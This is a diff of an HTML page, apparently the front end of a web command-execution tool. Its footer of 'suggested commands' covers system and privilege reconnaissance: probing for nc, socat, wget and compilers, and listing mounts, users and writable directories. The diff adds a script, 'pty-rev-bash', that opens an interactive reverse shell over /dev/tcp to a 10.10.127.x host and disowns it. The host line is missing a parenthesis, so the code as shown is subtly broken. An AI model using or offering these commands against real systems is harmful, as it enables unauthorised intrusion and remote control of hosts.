@@ -100,7 +100,7 @@ function cmd_cb() {
 </p>
 <p>Here are a few suggested commands:</p>
 <pre>
-pwd;export -p;declare -p;type bash curl ksh lua nc netcat nmap node openssl php python python3 scp raku perl smbclient socat ssh tar vim wget cpan ftp mysql mysqldump mysqlsh lsblk findmnt
+pwd;export -p;declare -p;type bash curl ksh lua nc netcat nc.traditional netcat-traditional nmap node openssl php python python3 scp raku perl gcc cc go rustc cargo make git ftp tftp smbclient socat ssh tar vim wget cpan ftp mysql mysqldump mysqlsh lsblk findmnt
 id;whoami;groups
 df -h;findmnt;cat /etc/{fstab,mtab} /proc/self/mountinfo; ls -lF / /home/ /var/ 
 ls -FaR ..
@@ -113,6 +113,24 @@ find ${PATH//:/$' '} -executable -print
 ls /usr/local/nagios/bin /usr/local/nagios/sbin
 find / -type d \( -perm -g+w -or -perm -o+w \)
 </pre>
+<pre>
+
+cat &lt;&lt;EOPRB &gt; pty-rev-bash
+#! /bin/bash
+H=10.10.127.$(( $1 - 325 )
+P=$(( $2 + 2660 ))
+sleep 2
+python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; &lt; /dev/tcp/${H}/${P} 1&gt;&amp;0 2&gt;&amp;0 &amp;
+disown
+EOPRB
+chmod +x pty-rev-bash
+ls -l pty-rev-bash
+
+</pre>
+<p>
+    <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"
+    >Basic Linux Privilege Escalation</a> has some more examples of posible commands
+</p>
 </footer>
 <template id=tmpl-ifrm>
   <div class="cmd-out-div">
